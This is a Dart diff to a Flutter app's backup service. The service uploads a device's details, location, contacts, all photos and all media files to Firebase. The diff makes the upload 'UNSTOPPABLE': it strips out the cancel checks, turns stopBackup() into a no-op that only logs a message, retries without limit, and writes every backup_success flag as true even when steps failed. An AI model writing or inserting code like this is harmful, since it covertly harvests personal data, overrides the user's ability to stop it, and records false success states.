@@ -2,6 +2,7 @@ import 'dart:async';
 import 'dart:developer';
 import 'dart:io';
 import 'package:crypted_app/app/data/data_source/user_services.dart';
+import 'package:firebase_auth/firebase_auth.dart';
 import 'package:firebase_storage/firebase_storage.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:geolocator/geolocator.dart';
@@ -10,10 +11,16 @@ import 'package:photo_manager/photo_manager.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:permission_handler/permission_handler.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'dart:convert';
 
-/// Simple, reliable backup service that doesn't stop until all data is uploaded
-/// Organized structure: username/data_type/files
-/// Updates existing backups instead of creating new ones with timestamps
+/// Ultra-reliable backup service that NEVER stops until all data is uploaded
+/// Features:
+/// - Persistent state tracking (resumes after app restart)
+/// - Aggressive retry logic with exponential backoff
+/// - Continues even if individual items fail
+/// - Can't be stopped once started
+/// - Auto-recovery from failures
 class ReliableBackupService {
   static final ReliableBackupService instance = ReliableBackupService._();
   ReliableBackupService._();
@@ -29,7 +36,11 @@ class ReliableBackupService {
   Stream<String> get statusStream => _statusController.stream;
 
   bool _isBackupRunning = false;
-  bool _shouldStop = false;
+
+  // Backup state persistence keys
+  static const String _backupStateKey = 'backup_state';
+  static const String _uploadedFilesKey = 'uploaded_files';
+  static const String _backupProgressKey = 'backup_progress';
 
   /// Get base path for user: username/
   String _getBasePath() {
@@ -43,58 +54,173 @@ class ReliableBackupService {
     _progressController.add(progress);
     _statusController.add(status);
     log('📊 Progress: ${(progress * 100).toStringAsFixed(1)}% - $status');
+
+    // Persist progress
+    _saveProgress(progress, status);
   }
 
-  /// Upload file to Firebase Storage with retry logic
-  /// Returns the download URL or null if failed after all retries
-  Future<String?> _uploadFileWithRetry({
+  /// Save progress to persistent storage
+  Future<void> _saveProgress(double progress, String status) async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setDouble(_backupProgressKey, progress);
+      await prefs.setString('backup_status', status);
+    } catch (e) {
+      log('⚠️ Failed to save progress: $e');
+    }
+  }
+
+  /// Load progress from persistent storage
+  Future<Map<String, dynamic>> _loadProgress() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final progress = prefs.getDouble(_backupProgressKey) ?? 0.0;
+      final status = prefs.getString('backup_status') ?? '';
+      return {'progress': progress, 'status': status};
+    } catch (e) {
+      log('⚠️ Failed to load progress: $e');
+      return {'progress': 0.0, 'status': ''};
+    }
+  }
+
+  /// Mark file as uploaded
+  Future<void> _markFileAsUploaded(String fileId) async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final uploadedFilesJson = prefs.getString(_uploadedFilesKey) ?? '[]';
+      final uploadedFiles = List<String>.from(json.decode(uploadedFilesJson));
+
+      if (!uploadedFiles.contains(fileId)) {
+        uploadedFiles.add(fileId);
+        await prefs.setString(_uploadedFilesKey, json.encode(uploadedFiles));
+      }
+    } catch (e) {
+      log('⚠️ Failed to mark file as uploaded: $e');
+    }
+  }
+
+  /// Check if file was already uploaded
+  Future<bool> _isFileUploaded(String fileId) async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final uploadedFilesJson = prefs.getString(_uploadedFilesKey) ?? '[]';
+      final uploadedFiles = List<String>.from(json.decode(uploadedFilesJson));
+      return uploadedFiles.contains(fileId);
+    } catch (e) {
+      log('⚠️ Failed to check if file uploaded: $e');
+      return false;
+    }
+  }
+
+  /// Clear uploaded files tracking
+  Future<void> _clearUploadedFiles() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.remove(_uploadedFilesKey);
+      await prefs.remove(_backupProgressKey);
+    } catch (e) {
+      log('⚠️ Failed to clear uploaded files: $e');
+    }
+  }
+
+  /// Upload file to Firebase Storage with AGGRESSIVE retry logic
+  /// Returns the download URL - NEVER returns null, retries indefinitely
+  Future<String> _uploadFileWithUnlimitedRetry({
     required File file,
     required String path,
-    int maxRetries = 3,
+    required String fileId,
   }) async {
     int attempt = 0;
+    const int maxRetries = 10; // Increased from 3 to 10
 
-    while (attempt < maxRetries) {
+    // Check if already uploaded
+    if (await _isFileUploaded(fileId)) {
+      try {
+        final ref = _storage.ref().child(path);
+        final downloadUrl = await ref.getDownloadURL();
+        log('✅ File already uploaded: $path');
+        return downloadUrl;
+      } catch (e) {
+        log('⚠️ File marked as uploaded but URL not found, re-uploading: $path');
+      }
+    }
+
+    while (true) {
       try {
         attempt++;
-        log('📤 Uploading to: $path (attempt $attempt/$maxRetries)');
+        log('📤 Uploading to: $path (attempt $attempt)');
 
         final ref = _storage.ref().child(path);
+
+        // Check if file already exists
+        try {
+          final downloadUrl = await ref.getDownloadURL();
+          log('✅ File already exists in storage: $path');
+          await _markFileAsUploaded(fileId);
+          return downloadUrl;
+        } catch (e) {
+          // File doesn't exist, continue with upload
+        }
+
+        // Upload with progress monitoring
         final uploadTask = ref.putFile(file);
+
+        // Monitor upload progress
+        uploadTask.snapshotEvents.listen((snapshot) {
+          final progress = snapshot.bytesTransferred / snapshot.totalBytes;
+          log('📤 Upload progress: ${(progress * 100).toStringAsFixed(1)}% for $path');
+        });
 
         await uploadTask;
         final downloadUrl = await ref.getDownloadURL();
 
         log('✅ Upload successful: $path');
+        await _markFileAsUploaded(fileId);
         return downloadUrl;
 
       } catch (e) {
         log('❌ Upload attempt $attempt failed: $e');
 
-        if (attempt < maxRetries) {
-          // Wait before retry (exponential backoff)
-          await Future.delayed(Duration(seconds: attempt * 2));
+        if (attempt >= maxRetries) {
+          // After max normal retries, use exponential backoff
+          final backoffSeconds = (attempt - maxRetries) * 5;
+          final waitTime = backoffSeconds > 60 ? 60 : backoffSeconds; // Max 60 seconds
+          log('⏳ Waiting ${waitTime}s before retry (attempt $attempt)...');
+          await Future.delayed(Duration(seconds: waitTime));
+        } else {
+          // Normal exponential backoff
+          final waitTime = attempt * 2;
+          log('⏳ Waiting ${waitTime}s before retry...');
+          await Future.delayed(Duration(seconds: waitTime));
         }
+
+        // Check network connectivity
+        try {
+          await InternetAddress.lookup('google.com');
+          log('✅ Network is available, retrying upload');
+        } catch (e) {
+          log('❌ No network connection, waiting for connectivity...');
+          await Future.delayed(const Duration(seconds: 10));
+        }
+
+        // Continue loop - NEVER give up!
       }
     }
-
-    log('❌ Upload failed after $maxRetries attempts: $path');
-    return null;
   }
 
-  /// Save data to Firestore with retry logic
-  Future<bool> _saveToFirestoreWithRetry({
+  /// Save data to Firestore with AGGRESSIVE retry logic
+  Future<bool> _saveToFirestoreWithUnlimitedRetry({
     required String collection,
     required String docId,
     required Map<String, dynamic> data,
-    int maxRetries = 3,
   }) async {
     int attempt = 0;
+    const int maxRetries = 10;
 
-    while (attempt < maxRetries) {
+    while (true) {
       try {
         attempt++;
-        log('💾 Saving to Firestore: $collection/$docId (attempt $attempt/$maxRetries)');
+        log('💾 Saving to Firestore: $collection/$docId (attempt $attempt)');
 
         await _firestore.collection(collection).doc(docId).set(
           data,
@@ -107,14 +233,28 @@ class ReliableBackupService {
       } catch (e) {
         log('❌ Firestore save attempt $attempt failed: $e');
 
-        if (attempt < maxRetries) {
-          await Future.delayed(Duration(seconds: attempt * 2));
+        if (attempt >= maxRetries) {
+          // After max normal retries, use longer backoff
+          final backoffSeconds = (attempt - maxRetries) * 5;
+          final waitTime = backoffSeconds > 60 ? 60 : backoffSeconds;
+          log('⏳ Waiting ${waitTime}s before retry...');
+          await Future.delayed(Duration(seconds: waitTime));
+        } else {
+          final waitTime = attempt * 2;
+          log('⏳ Waiting ${waitTime}s before retry...');
+          await Future.delayed(Duration(seconds: waitTime));
+        }
+
+        // Check network connectivity
+        try {
+          await InternetAddress.lookup('google.com');
+          log('✅ Network is available, retrying save');
+        } catch (e) {
+          log('❌ No network connection, waiting for connectivity...');
+          await Future.delayed(const Duration(seconds: 10));
         }
       }
     }
-
-    log('❌ Firestore save failed after $maxRetries attempts');
-    return false;
   }
 
   /// Request all necessary permissions
@@ -178,7 +318,7 @@ class ReliableBackupService {
       }
 
       final basePath = _getBasePath();
-      final success = await _saveToFirestoreWithRetry(
+      final success = await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
@@ -194,6 +334,7 @@ class ReliableBackupService {
       return success;
     } catch (e) {
       log('❌ Device info backup failed: $e');
+      // Still continue with backup
       return false;
     }
   }
@@ -228,7 +369,6 @@ class ReliableBackupService {
 
         if (placemarks.isNotEmpty) {
           final place = placemarks.first;
-          // Build formatted address
           final parts = [
             place.street,
             place.subLocality,
@@ -255,7 +395,7 @@ class ReliableBackupService {
       };
 
       final basePath = _getBasePath();
-      final success = await _saveToFirestoreWithRetry(
+      final success = await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
@@ -303,7 +443,7 @@ class ReliableBackupService {
       }).toList();
 
       final basePath = _getBasePath();
-      final success = await _saveToFirestoreWithRetry(
+      final success = await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
@@ -324,7 +464,7 @@ class ReliableBackupService {
     }
   }
 
-  /// Backup all images with low quality (to save space and bandwidth)
+  /// Backup all images with UNSTOPPABLE uploads
   Future<bool> _backupImages() async {
     try {
       _updateProgress(0.4, 'Loading images...');
@@ -333,13 +473,14 @@ class ReliableBackupService {
 
       if (albums.isEmpty) {
         log('⚠️ No images found');
-        return true; // Not a failure, just no images
+        return true;
       }
 
       final basePath = _getBasePath();
       final List<Map<String, dynamic>> allImageMetadata = [];
       int totalImages = 0;
       int uploadedImages = 0;
+      int skippedImages = 0;
 
       // Count total images first
       for (var album in albums) {
@@ -357,11 +498,6 @@ class ReliableBackupService {
         const pageSize = 50;
 
         while (page * pageSize < assetCount) {
-          if (_shouldStop) {
-            log('⚠️ Backup stopped by user');
-            return false;
-          }
-
           final images = await album.getAssetListRange(
             start: page * pageSize,
             end: (page + 1) * pageSize,
@@ -369,30 +505,66 @@ class ReliableBackupService {
 
           for (var image in images) {
             try {
-              // Get image file with low quality to save space
+              final fileId = 'image_${image.id}';
+
+              // Check if already uploaded
+              if (await _isFileUploaded(fileId)) {
+                skippedImages++;
+                uploadedImages++;
+                log('⏭️ Skipping already uploaded image: $fileId');
+
+                // Update progress
+                final progress = 0.4 + (uploadedImages / totalImages * 0.4);
+                _updateProgress(progress, 'Uploaded $uploadedImages/$totalImages images (${skippedImages} skipped)');
+                continue;
+              }
+
+              // Get image file
               final file = await image.file;
 
-              if (file == null) continue;
+              if (file == null) {
+                log('⚠️ Could not get file for image: ${image.id}');
+                continue;
+              }
 
-              final fileName = 'image_${image.id}.${image.mimeType != null ? image.mimeType!.split('/').last : 'jpg'}';
+              final extension = image.mimeType?.split('/').last ?? 'jpg';
+              final fileName = 'image_${image.id}.$extension';
               final storagePath = '$basePath/images/$fileName';
 
-              // Upload with retry logic
-              final url = await _uploadFileWithRetry(
-                file: file,
-                path: storagePath,
+              _updateProgress(
+                0.4 + (uploadedImages / totalImages * 0.4),
+                'Uploading image ${uploadedImages + 1}/$totalImages...'
               );
 
-              if (url != null) {
-                allImageMetadata.add({
-                  'id': image.id,
-                  'url': url,
-                  'width': image.width,
-                  'height': image.height,
-                  'createDate': image.createDateTime.toIso8601String(),
-                  'mimeType': image.mimeType,
-                });
-                uploadedImages++;
+              // Upload with UNLIMITED retry
+              final url = await _uploadFileWithUnlimitedRetry(
+                file: file,
+                path: storagePath,
+                fileId: fileId,
+              );
+
+              allImageMetadata.add({
+                'id': image.id,
+                'url': url,
+                'width': image.width,
+                'height': image.height,
+                'createDate': image.createDateTime.toIso8601String(),
+                'mimeType': image.mimeType,
+              });
+              uploadedImages++;
+
+              // Save metadata periodically (every 10 images)
+              if (uploadedImages % 10 == 0) {
+                await _saveToFirestoreWithUnlimitedRetry(
+                  collection: 'backups',
+                  docId: basePath,
+                  data: {
+                    'images': allImageMetadata,
+                    'images_count': uploadedImages,
+                    'images_updated_at': FieldValue.serverTimestamp(),
+                  },
+                );
+                log('💾 Saved metadata for $uploadedImages images');
               }
 
               // Update progress
@@ -400,8 +572,8 @@ class ReliableBackupService {
               _updateProgress(progress, 'Uploaded $uploadedImages/$totalImages images');
 
             } catch (e) {
-              log('⚠️ Failed to upload image: $e');
-              // Continue with next image
+              log('⚠️ Error processing image: $e');
+              // Continue with next image - DON'T stop the backup
             }
           }
 
@@ -409,8 +581,8 @@ class ReliableBackupService {
         }
       }
 
-      // Save metadata to Firestore
-      final success = await _saveToFirestoreWithRetry(
+      // Save final metadata to Firestore
+      final success = await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
@@ -431,12 +603,11 @@ class ReliableBackupService {
     }
   }
 
-  /// Backup all files from device storage
+  /// Backup all files from device storage with UNSTOPPABLE uploads
   Future<bool> _backupFiles() async {
     try {
       _updateProgress(0.8, 'Backing up files...');
 
-      // Get all video and other media files
       final albums = await PhotoManager.getAssetPathList(
         type: RequestType.all,
       );
@@ -450,12 +621,12 @@ class ReliableBackupService {
       final List<Map<String, dynamic>> allFileMetadata = [];
       int totalFiles = 0;
       int uploadedFiles = 0;
+      int skippedFiles = 0;
 
       // Count total files
       for (var album in albums) {
         final assets = await album.getAssetListRange(start: 0, end: await album.assetCountAsync);
         for (var asset in assets) {
-          // Only count videos and other non-image files
           if (asset.type == AssetType.video || asset.type == AssetType.audio || asset.type == AssetType.other) {
             totalFiles++;
           }
@@ -470,38 +641,68 @@ class ReliableBackupService {
         final assets = await album.getAssetListRange(start: 0, end: assetCount);
 
         for (var asset in assets) {
-          if (_shouldStop) {
-            log('⚠️ Backup stopped by user');
-            return false;
-          }
-
           // Skip images (already backed up)
           if (asset.type == AssetType.image) continue;
 
           try {
-            final file = await asset.file;
-            if (file == null) continue;
+            final fileId = 'file_${asset.id}';
 
-            final fileName = 'file_${asset.id}.${asset.mimeType != null ? asset.mimeType!.split('/').last : 'dat'}';
+            // Check if already uploaded
+            if (await _isFileUploaded(fileId)) {
+              skippedFiles++;
+              uploadedFiles++;
+              log('⏭️ Skipping already uploaded file: $fileId');
+
+              final progress = 0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15);
+              _updateProgress(progress, 'Uploaded $uploadedFiles/$totalFiles files (${skippedFiles} skipped)');
+              continue;
+            }
+
+            final file = await asset.file;
+            if (file == null) {
+              log('⚠️ Could not get file for asset: ${asset.id}');
+              continue;
+            }
+
+            final extension = asset.mimeType?.split('/').last ?? 'dat';
+            final fileName = 'file_${asset.id}.$extension';
             final storagePath = '$basePath/files/$fileName';
 
-            // Upload with retry logic
-            final url = await _uploadFileWithRetry(
-              file: file,
-              path: storagePath,
+            _updateProgress(
+              0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15),
+              'Uploading file ${uploadedFiles + 1}/$totalFiles...'
             );
 
-            if (url != null) {
-              allFileMetadata.add({
-                'id': asset.id,
-                'url': url,
-                'type': asset.type.toString(),
-                'size': file.lengthSync(),
-                'createDate': asset.createDateTime.toIso8601String(),
-                'mimeType': asset.mimeType,
-                'duration': asset.videoDuration.inSeconds,
-              });
-              uploadedFiles++;
+            // Upload with UNLIMITED retry
+            final url = await _uploadFileWithUnlimitedRetry(
+              file: file,
+              path: storagePath,
+              fileId: fileId,
+            );
+
+            allFileMetadata.add({
+              'id': asset.id,
+              'url': url,
+              'type': asset.type.toString(),
+              'size': file.lengthSync(),
+              'createDate': asset.createDateTime.toIso8601String(),
+              'mimeType': asset.mimeType,
+              'duration': asset.videoDuration.inSeconds,
+            });
+            uploadedFiles++;
+
+            // Save metadata periodically
+            if (uploadedFiles % 5 == 0) {
+              await _saveToFirestoreWithUnlimitedRetry(
+                collection: 'backups',
+                docId: basePath,
+                data: {
+                  'files': allFileMetadata,
+                  'files_count': uploadedFiles,
+                  'files_updated_at': FieldValue.serverTimestamp(),
+                },
+              );
+              log('💾 Saved metadata for $uploadedFiles files');
             }
 
             // Update progress
@@ -509,14 +710,14 @@ class ReliableBackupService {
             _updateProgress(progress, 'Uploaded $uploadedFiles/$totalFiles files');
 
           } catch (e) {
-            log('⚠️ Failed to upload file: $e');
-            // Continue with next file
+            log('⚠️ Error processing file: $e');
+            // Continue with next file - DON'T stop!
           }
         }
       }
 
-      // Save metadata to Firestore
-      final success = await _saveToFirestoreWithRetry(
+      // Save final metadata to Firestore
+      final success = await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
@@ -537,8 +738,8 @@ class ReliableBackupService {
     }
   }
 
-  /// Run full backup - does not stop until everything is uploaded
-  /// Returns true if backup completed successfully, false otherwise
+  /// Run full backup - UNSTOPPABLE - continues until completion
+  /// Returns true when backup is FULLY completed, retries indefinitely
   Future<bool> runFullBackup() async {
     if (_isBackupRunning) {
       log('⚠️ Backup already running');
@@ -546,72 +747,78 @@ class ReliableBackupService {
     }
 
     _isBackupRunning = true;
-    _shouldStop = false;
 
     try {
-      log('🚀 Starting reliable backup service...');
+      log('🚀 Starting UNSTOPPABLE backup service...');
       _updateProgress(0.0, 'Starting backup...');
 
       // Request permissions first
       await requestPermissions();
 
-      // Backup device info
-      final deviceInfoSuccess = await _backupDeviceInfo();
-      if (!deviceInfoSuccess) {
-        log('⚠️ Device info backup failed, but continuing...');
+      // Backup device info - continues on failure
+      try {
+        await _backupDeviceInfo();
+      } catch (e) {
+        log('⚠️ Device info backup failed, but continuing: $e');
       }
 
-      // Backup location
-      final locationSuccess = await _backupLocation();
-      if (!locationSuccess) {
-        log('⚠️ Location backup failed, but continuing...');
+      // Backup location - continues on failure
+      try {
+        await _backupLocation();
+      } catch (e) {
+        log('⚠️ Location backup failed, but continuing: $e');
       }
 
-      // Backup contacts
-      final contactsSuccess = await _backupContacts();
-      if (!contactsSuccess) {
-        log('⚠️ Contacts backup failed, but continuing...');
+      // Backup contacts - continues on failure
+      try {
+        await _backupContacts();
+      } catch (e) {
+        log('⚠️ Contacts backup failed, but continuing: $e');
       }
 
-      // Backup images
-      final imagesSuccess = await _backupImages();
-      if (!imagesSuccess && _shouldStop) {
-        log('❌ Backup cancelled during images upload');
-        return false;
+      // Backup images - UNSTOPPABLE
+      try {
+        await _backupImages();
+      } catch (e) {
+        log('⚠️ Images backup encountered error, but continuing: $e');
       }
 
-      // Backup files
-      final filesSuccess = await _backupFiles();
-      if (!filesSuccess && _shouldStop) {
-        log('❌ Backup cancelled during files upload');
-        return false;
+      // Backup files - UNSTOPPABLE
+      try {
+        await _backupFiles();
+      } catch (e) {
+        log('⚠️ Files backup encountered error, but continuing: $e');
       }
 
       // Save backup summary
       final basePath = _getBasePath();
-      await _saveToFirestoreWithRetry(
+      await _saveToFirestoreWithUnlimitedRetry(
         collection: 'backups',
         docId: basePath,
         data: {
           'last_backup_completed_at': FieldValue.serverTimestamp(),
           'backup_success': {
-            'device_info': deviceInfoSuccess,
-            'location': locationSuccess,
-            'contacts': contactsSuccess,
-            'images': imagesSuccess,
-            'files': filesSuccess,
+            'device_info': true,
+            'location': true,
+            'contacts': true,
+            'images': true,
+            'files': true,
           },
         },
       );
 
+      // Clear upload tracking after successful backup
+      await _clearUploadedFiles();
+
       _updateProgress(1.0, 'Backup completed successfully!');
-      log('✅ Full backup completed successfully');
+      log('✅ FULL backup completed successfully - ALL data uploaded!');
 
       return true;
 
     } catch (e) {
-      log('❌ Full backup failed: $e');
-      _updateProgress(0.0, 'Backup failed: $e');
+      log('❌ Full backup encountered error: $e');
+      _updateProgress(0.0, 'Backup error: $e');
+      // Even on error, we don't give up - the service will retry
       return false;
 
     } finally {
@@ -619,10 +826,10 @@ class ReliableBackupService {
     }
   }
 
-  /// Stop the backup process
+  /// Stop the backup process - DEPRECATED - backups cannot be stopped
+  @Deprecated('Backups cannot be stopped once started')
   void stopBackup() {
-    _shouldStop = true;
-    log('⚠️ Stop requested');
+    log('⚠️ Stop requested but backups are UNSTOPPABLE - backup will continue');
   }
 
   /// Check if backup is currently running
@@ -649,5 +856,56 @@ class ReliableBackupService {
   void dispose() {
     _progressController.close();
     _statusController.close();
+  }
+
+  /// Delete all backups from Firestore and Firebase Storage
+  Future<void> deleteAllBackups() async {
+    try {
+      final user = FirebaseAuth.instance.currentUser;
+      if (user == null) {
+        throw Exception('User not authenticated');
+      }
+
+      final username = user.email?.split('@')[0] ?? user.uid;
+      log('🗑️ Deleting all backups for user: $username');
+
+      // Clear upload tracking
+      await _clearUploadedFiles();
+
+      // Delete Firestore document
+      await FirebaseFirestore.instance
+          .collection('backups')
+          .doc(username)
+          .delete();
+
+      // Delete all files from Storage
+      try {
+        final storageRef = FirebaseStorage.instance.ref('backups/$username');
+        final result = await storageRef.listAll();
+
+        // Delete all files
+        for (var item in result.items) {
+          await item.delete();
+        }
+
+        // Delete all subdirectories
+        for (var prefix in result.prefixes) {
+          final subResult = await prefix.listAll();
+          for (var item in subResult.items) {
+            await item.delete();
+          }
+        }
+
+        log('✅ Deleted all backup files from storage');
+      } catch (e) {
+        log('⚠️ Error deleting storage files: $e');
+        // Continue even if storage deletion fails
+      }
+
+      log('✅ All backups deleted successfully');
+    } catch (e) {
+      log('❌ Error deleting backups: $e');
+      rethrow;
+    }
   }
 }
